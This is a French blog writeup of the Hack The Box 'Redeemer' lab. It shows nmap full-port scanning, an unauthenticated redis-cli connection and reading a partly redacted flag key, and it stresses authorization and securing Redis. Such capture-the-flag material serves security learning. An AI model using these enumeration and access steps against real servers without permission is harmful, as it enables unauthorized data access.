---
title: "Redeemer"
date: 2026-01-12
description: "Découverte du service de base de données Redis."
draft: false

# Tes taxonomies (correspondant à ton hugo.toml)
tags: ["Misconfiguration", "Nmap", "Database", "Redis", "Linux", "Tier 0"]
categories: ["Writeups", "Hack The Box", "Starting Point"]
---

# Introduction

**Redeemer** est la quatrième box du parcours *Starting Point* de [Hack The Box](https://www.hackthebox.com/). Après avoir exploré **Telnet**, **FTP** et **SMB**, on monte d’un cran. Aujourd’hui, on ne fouille pas dans des fichiers, on s’attaque à un service de base de données très populaire : **Redis**.

>[!WARNING]
>Dans ce writeup, je ne publie pas directement le flag final, l’objectif est d’apprendre en pratiquant. Si vous voulez le flag, suivez les étapes sur la machine.

>[!CAUTION]
>**NOTE :** n’attaquez que des machines sur lesquelles vous avez l’autorisation (ex. machines HTB, ou lab perso). Respectez les règles de la plateforme.

## Vidéo Walkthrough

Si tu préfères regarder un tuto plutôt que lire, voici ma vidéo :

{{< youtubeLite id="9FJurDpKBLE" label="Redeemer Walkthrough" >}}

---

## Reconnaissance

### Découverte d’hôte

Comme d’habitude, la première étape est de vérifier que la machine répond avec la commande ``ping`` suivie de l'**IP** de la cible. On s'assure ainsi que le VPN est bien connecté et que la cible est vivante.
```bash
┌─[user@parrot]─[~]
└──╼ $ping 10.129.2.212

PING 10.129.2.212 (10.129.2.212) 56(84) bytes of data.
64 bytes from 10.129.2.212: icmp_seq=1 ttl=63 time=14.5 ms
64 bytes from 10.129.2.212: icmp_seq=2 ttl=63 time=15.5 ms
^C
--- 10.129.2.212 ping statistics ---
3 packets transmitted, 2 received, 33% packet loss, time 2009ms
rtt min/avg/max/mdev = 14.514/15.030/15.546/0.516 ms
```
La machine est bien là. On peut passer aux choses sérieuses !

### Énumération des services

On lance un scan ``nmap`` classique sur les 1000 ports les plus connus pour voir ce qui tourne.
```bash
┌─[✗s]─[user@parrot]─[~]
└──╼ $nmap -sV 10.129.2.212

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-02 19:25 UTC
Nmap scan report for 10.129.2.212
Host is up (0.036s latency).
All 1000 scanned ports on 10.129.2.212 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)
```
Petit moment de frustration, ``nmap`` nous dit que tout est fermé. Mais on ne s'avoue pas vaincu ! Parfois, les services tournent sur des ports "exotiques" en dehors du top 1000.

La solution est donc de scanner **TOUS** les ports (les 65535 possibles) avec l’option ``-p-``. Soyez patients, ça prend un peu plus de temps !
```bash
┌─[user@parrot]─[~]
└──╼ $nmap -p- -sV 10.129.2.212

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-02 19:29 UTC
Nmap scan report for 10.129.2.212
Host is up (0.020s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```
Et voilà ! On a trouvé un port ouvert : le **6379**. Le service est **Redis** (version 5.0.7).

C’est quoi **Redis** ? C’est un système de stockage de données en mémoire (RAM), souvent utilisé comme base de données **clé-valeur** ultra-rapide ou comme système de cache.

---

## Pré-Exploitation

### Evaluation de vulnérabilité

Pour interagir avec un serveur Redis, on utilise l’outil ``redis-cli``. Si vous ne l'avez pas, il s'installe souvent avec le paquet ``redis-tools``.
```bash
sudo apt install redis-tools
```
Une fois ``redis-cli`` installé, on va tenter une connexion directe sans mot de passe pour voir si le serveur est mal configuré.
```bash
┌─[user@parrot]─[~]
└──╼ $redis-cli -h 10.129.2.212

10.129.2.212:6379>
```
On a un prompt ! Cela signifie qu’on est connecté **sans aucune authentification**. C’est une faille critique de configuration.

---

## Exploitation

### Exploration de la base de données

Une fois à l’intérieur, on veut savoir ce qu’il y a dans le ventre de la bête. On utilise la commande ``info`` pour obtenir des statistiques sur le serveur. Ce qui nous intéresse se trouve généralement tout à la fin, dans la section **#Keyspace**.
```bash
10.129.2.212:6379> info

# Server
redis_version:5.0.7
<... SKIP ...>
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```
On voit que la base de données **db0** contient 4 clés. C'est là que doit se cacher notre trésor.

### Récupération des données

On commence par sélectionner la base de données **0** avec la commande ``select``
```bash
10.129.2.212:6379> select 0

OK
```
Maintenant, listons toutes les clés présentes dans cette base avec ``keys *``

```bash
10.129.2.212:6379> keys *

1) "temp"
2) "numb"
3) "flag"
4) "stor"
```
Tiens donc, une clé nommée “**flag**”... comme c'est curieux ! Dans Redis, pour lire la valeur d'une clé simple, on utilise la commande ``get``.

```bash
10.129.2.212:6379> get flag

"03e{...}3eb"
```
Et voilà ! Le flag est à nous.

---

## Post-Exploitation

On peut quitter proprement l’interface Redis avec la commande ``exit`` :

```bash
10.129.2.212:6379> exit
```

Ce qu’il faut retenir : **Redis** est extrêmement puissant mais ne possède pas de couche de sécurité robuste par défaut s’il est exposé sur le réseau sans mot de passe. Toujours vérifier que vos bases de données ne sont pas accessibles publiquement sans authentification, sinon c’est la porte ouverte à n’importe quel curieux (comme nous).

La machine est ***pwned*** !

<!-- ---

## Pour aller plus loin

### Script automatisé
Ce n'est pas encore fait mais je prévois de faire un script automatisé !

### Rapport professionnel
Ce n'est pas encore fait mais je prévois de faire un rapport professionnel ! -->